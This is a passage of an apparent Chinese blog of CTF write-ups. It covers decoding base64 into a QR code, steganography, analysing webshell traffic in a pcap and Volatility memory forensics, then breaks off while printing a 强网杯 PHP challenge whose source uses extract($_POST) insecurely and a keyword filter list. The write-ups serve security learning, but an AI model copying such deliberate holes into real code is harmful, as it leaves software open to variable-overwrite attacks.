77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61&quot;</span></span><br><span class="line">a = a.split(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(chr(int(i)),end=&#x27;&#x27;)</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#MDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA==</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;MDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA==&quot;</span></span><br><span class="line">s = base64.b64decode(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>0101的组合，长和宽都是37位，果断猜一下转二维码，脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">x = <span class="number">37</span>   <span class="comment">#注意这里一定要看一下高度和宽度</span></span><br><span class="line">y = <span class="number">37</span></span><br><span class="line">im = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (x, y))</span><br><span class="line">white = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">black = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\vscodework\\python\\misc\\key.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">        ff = f.readline()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">            <span class="keyword">if</span> ff[j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                im.putpixel((i, j), black)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                im.putpixel((i, j), white)</span><br><span class="line">im.save(<span class="string">&quot;D:\\vscodework\\python\\misc\\1.jpg&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/changanzhanyi/13.png" alt="image-20220118172445205"></p><h5 id="Ez-Steg"><a href="#Ez-Steg" class="headerlink" title="Ez_Steg"></a>Ez_Steg</h5><p>下载附件，解压一下有密码，有注释，六个数字<br><img src="/images/changanzhanyi/14.png" alt="image-20220118202827001"><br>爆破一下密码220101<br><img src="/images/changanzhanyi/15.png" alt="image-20220118202926688"><br>两个文件，一个emjio表情，理论上来说是emjio加密，一个pyc文件，反编译出来  没啥用，就不会了<br>后来看大师傅的wp，是剑龙加密，<code>https://github.com/AngelKitty/stegosaurus</code><br><img src="/images/changanzhanyi/16.png" alt="image-20220118204451068">接一下有个key<br>拿去emjio解密<code>https://aghorler.github.io/emoji-ae</code><br><img src="/images/changanzhanyi/17.png" alt="image-20220118204700866"><br><img src="/images/changanzhanyi/18.png" alt="image-20220118204716886"></p><h5 id="无字天书"><a href="#无字天书" class="headerlink" title="无字天书"></a>无字天书</h5><p>拿到附件解压一下，过滤http和1.php 1.php是个冰蝎的马子<br>有一个读取文件的操作，追踪http流，下面<code>504b0304</code>是zip16进制头<br><img src="/images/changanzhanyi/19.png" alt="image-20220119144025872"><br><img src="/images/changanzhanyi/20.png" alt="image-20220119144107117"><br>复制出来用winhex做一个，解压是两个文件<code>.ws</code>文件是whitespace加密，解密一下，是密码，在线网址<code>http://vii5ard.github.io/whitespace/</code><br><img src="/images/changanzhanyi/21.png" alt="image-20220119150500514"><br><img src="/images/changanzhanyi/22.png" alt="image-20220119144904711"><br><code>XiAnWillBeSafe</code><br>然后是snow加密，项目地址在下面，解密一下就出了<br><img src="/images/changanzhanyi/23.png" alt="image-20220119150041048"><br><code>http://www.darkside.com.au/snow/</code></p><h5 id="朴实无华的取证"><a href="#朴实无华的取证" class="headerlink" title="朴实无华的取证"></a>朴实无华的取证</h5><p>拿到文件先看一下镜像系统信息<br><code>python2 vol.py -f xp_sp3.raw imageinfo</code><br><img src="/images/changanzhanyi/24.png" alt="image-20220120160029257"><br>是winxpsp2x86,看下file，一般filescan给出的信息太多了，题目如果给提示的话，一般grep下提示，不给的话grepflag<br><code>python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 filescan | grep &#39;flag&#39;</code><br><img src="/images/changanzhanyi/25.png" alt="image-20220120160645562"><br>我们可以看到桌面上有flag.zip和flag.png，统统提取出来看下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 dumpfiles -Q 0x0000000001b34f90 -D ./cab -u</span><br><span class="line">python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 dumpfiles -Q 0x0000000001e65028 -D ./cab -u</span><br></pre></td></tr></table></figure><p>我们file一下  改下名字  好区分<br><img src="/images/changanzhanyi/26.png" alt="image-20220120161811945"><br>zip压缩包是有密码的<br><img src="/images/changanzhanyi/27.png" alt="image-20220120162354291"><br>cmd中还有一个日记，提出来<img src="/images/changanzhanyi/28.png" alt="image-20220120162811234"><br>看到是密码，解压一下，里面是加密的代码<br><img src="/images/changanzhanyi/29.png" alt="image-20220120162911649"><br><img src="/images/changanzhanyi/30.png" alt="image-20220120162945826"><br>把flag图片里的内容提出来，转换一下就出了</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>emmm 太菜了<br>一直在路上</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> 长安杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021强网杯wp</title>
      <link href="/2021/06/24/2021%E5%BC%BA%E7%BD%91%E6%9D%AFwp/"/>
      <url>/2021/06/24/2021%E5%BC%BA%E7%BD%91%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="寻宝"><a href="#寻宝" class="headerlink" title="寻宝"></a>寻宝</h2><p>开局给了源代码，那应该是考察php的特性了，我们一点一点的看，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ppp</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$ppp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;nunber3&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$num1</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num2</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num3</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number3&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num4</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>]);</span><br><span class="line"><span class="variable">$num5</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>]);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;非数字&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1</span> &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;第一层&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2</span> + <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;第二层&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num3</span>) &amp;&amp; <span class="string">&#x27;4bf21cd&#x27;</span> === substr(md5(<span 